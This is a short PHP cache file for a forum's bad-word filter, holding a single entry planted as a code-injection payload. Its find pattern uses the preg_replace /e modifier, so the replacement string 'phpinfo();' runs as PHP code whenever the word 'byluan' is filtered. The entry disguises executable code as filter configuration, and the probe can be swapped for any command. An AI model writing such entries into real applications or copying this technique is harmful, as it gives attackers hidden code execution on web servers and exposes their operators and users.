<?php
$_CACHE['badwords'] = array (
  'findpattern' => 
  array (
    'byluan' => '/byluan.*/e',
  ),
  'replace' => 
  array (
    'byluan' => 'phpinfo();',
  ),
);
